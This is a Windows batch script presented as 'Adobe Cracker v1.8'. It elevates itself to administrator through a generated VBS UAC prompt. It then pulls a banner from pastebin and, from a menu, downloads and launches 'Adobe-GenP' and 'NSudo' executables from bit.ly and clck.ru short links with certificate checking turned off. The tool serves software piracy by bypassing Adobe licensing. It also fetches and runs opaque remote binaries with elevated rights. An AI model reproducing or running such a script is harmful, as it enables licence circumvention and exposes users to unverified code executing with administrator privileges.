@echo off

:: Проверка прав администратора
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"

:: Если права администратора не были получены, повторный запуск с запросом прав
if '%errorlevel%' NEQ '0' (
    echo Повторный запуск с запросом прав...
    echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
    echo UAC.ShellExecute "%~s0", "", "", "runas", 1 >> "%temp%\getadmin.vbs"
    "%temp%\getadmin.vbs"
    del "%temp%\getadmin.vbs"
    exit /B
)

:: Менюшка
color 3
title Adobe Cracker v1.8

:menu
ping -n 1 https://pastebin.com >nul
if %errorlevel% equ 0 (
    curl -k https://pastebin.com/raw/30zt5svh
) else (
    echo Adobe Cracker
)
echo Adobe Cracker v1.8 by entitybtw                                                                                                                                                           
echo Select Option:
echo 1. Creative Cloud Download
echo 2. Download Adobe Genp
echo 3. Start Adobe Genp
set /p choice="Select number, and click enter: "
if %choice%==1 (
    cd C:\Program Files
    mkdir CreativeCloud_Installer
    cd CreativeCloud_Installer
    curl -k -o Creative_Cloud_Set-Up.exe https://prod-rel-ffc-ccm.oobesaas.adobe.com/adobe-ffc-external/core/v1/wam/download?sapCode=KCCC&productName=Creative%20Cloud&os=win&guid=cb5e9456-fbdb-459c-ae66-1943a24c928f&contextParams=%7B%22component%22%3A%22cc-home%22%2C%22visitor_guid%22%3A%2274906243873269504780326026032836384693%22%2C%22campaign_id%22%3A%2224179%7C2021-10-cme-1%7C2023-04-kaizenSSOLoggedOut%22%2C%22browser%22%3A%22firefox%22%2C%22context_guid%22%3A%226d9a3120-52d1-4120-8ca1-f71f30865097%22%2C%22variation_id%22%3A%2267650%3A24179%7Ctest%3A2021-10-cme-1%7Ccontrol%3A2023-04-kaizenSSOLoggedOut%22%2C%22experience_id%22%3A%22na%3A24179%7Cna%3A2021-10-cme-1%7Cna%3A2023-04-kaizenSSOLoggedOut%22%2C%22planCodeList%22%3A%22%22%2C%22updateCCD%22%3A%22true%22%2C%22secondarySapcodeList%22%3A%22%22%2C%22Product_ID_Promoted%22%3A%22KCCC%22%2C%22contextComName%22%3A%22ACom%3ACCH%22%2C%22contextSvcName%22%3A%22NO-CCD%22%2C%22contextOrigin%22%3A%22ACom%3ACCH%22%2C%22gpv%22%3A%22helpx.adobe.com%3Adownload-install%3Akb%3Acreative-cloud-desktop-app-download%22%2C%22creative-cloud-referrer%22%3A%22https%3A%2F%2Fhelpx.adobe.com%2F%22%2C%22AMCV_D6FAAFAD54CA9F560A4C98A5%2540AdobeOrg%22%3A%22-2121179033%257CMCIDTS%257C19748%257CMCMID%257C74906243873269504780326026032836384693%257CMCOPTOUT-1706255542s%257CNONE%257CvVersion%257C5.3.0%22%2C%22mid%22%3A%2246635800947393516619134453568388681681%22%2C%22aid%22%3A%22%22%2C%22AppMeasurementVersion%22%3A%222.23.0%22%2C%22kaizenTrialDuration%22%3A7%7D&wamFeature=nuj-live&environment=prod&api_key=CCHomeWeb1
    start Creative_Cloud_Set-Up.exe
    cls
    goto menu
) else if %choice%==2 (
    cd C:\Program Files
    mkdir Adobe_Genp
    cd Adobe_Genp
    curl -k -L -o Adobe-GenP-3.0.exe http://bit.ly/genp3
    curl -k -L -o NSudo.exe https://bit.ly/nsudo1
    mkdir ICONS
    cd ICONS
    curl -k -L -o Cure.bmp https://clck.ru/38E2iJ
    curl -k -L -o Skull.ico https://clck.ru/38E2kz
    cd C:\Program Files\Adobe_Genp
    start Adobe-GenP-3.0.exe
    cls
    goto menu
) else if %choice%==3 (
    cd C:\Program Files\Adobe_Genp
    start Adobe-GenP-3.0.exe
    cls
    goto menu
    
) else (
    cls
    echo Incorrect. Please, select 1, 2 or 3.
    goto menu
)
pause
